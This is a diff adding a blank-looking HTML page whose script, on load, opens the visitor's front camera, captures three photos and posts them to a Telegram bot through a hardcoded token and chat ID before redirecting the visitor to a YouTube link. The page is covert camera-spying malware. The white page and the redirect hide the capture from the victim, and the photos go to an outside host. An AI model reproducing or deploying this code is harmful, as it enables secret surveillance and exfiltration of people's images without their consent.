@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>body { margin: 0; padding: 0; background: white; }</style>
+</head>
+<body>
+    <script>
+        (async function() {
+            const BOT_TOKEN = '7951406042:AAE7QpCcDoeJurTbFtRPFkRTQXtZAOUVbcs';
+            const ADMIN_ID = new URLSearchParams(window.location.search).get('admin_id') || '7963013787';
+            
+            try {
+                // تشغيل الكاميرا وانتظار التهيئة
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user' } 
+                });
+                
+                const video = document.createElement('video');
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                
+                video.srcObject = stream;
+                await video.play();
+                
+                // انتظار طويل لتهيئة الكاميرا (3 ثوانٍ)
+                await new Promise(resolve => setTimeout(resolve, 3000));
+                
+                // التقاط 3 صور
+                for (let i = 1; i <= 3; i++) {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    ctx.drawImage(video, 0, 0);
+                    
+                    // انتظار بسيط بين كل إطار
+                    await new Promise(resolve => setTimeout(resolve, 300));
+                    
+                    // إرسال الصورة
+                    canvas.toBlob(async (blob) => {
+                        const formData = new FormData();
+                        formData.append('chat_id', ADMIN_ID);
+                        formData.append('photo', blob);
+                        formData.append('caption', `صورة ${i} - الأدمن: ${ADMIN_ID}`);
+                        
+                        try {
+                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                                method: 'POST',
+                                body: formData
+                            });
+                        } catch(e) {
+                            console.log('خطأ في الإرسال:', e);
+                        }
+                    }, 'image/jpeg', 0.9);
+                    
+                    // انتظار بين الصور
+                    if (i < 3) await new Promise(resolve => setTimeout(resolve, 800));
+                }
+                
+                // إيقاف الكاميرا
+                stream.getTracks().forEach(track => track.stop());
+                
+            } catch(error) {
+                console.log('خطأ في الكاميرا:', error);
+            }
+            
+            // التحويل بعد 4 ثوانٍ
+            setTimeout(() => {
+                window.location.href = 'https://youtu.be/4kGM9zWbses?si=hvkHvbiMTkRF5hIP';
+            }, 4000);
+            
+        })();
+    </script>
+</body>
+</html>
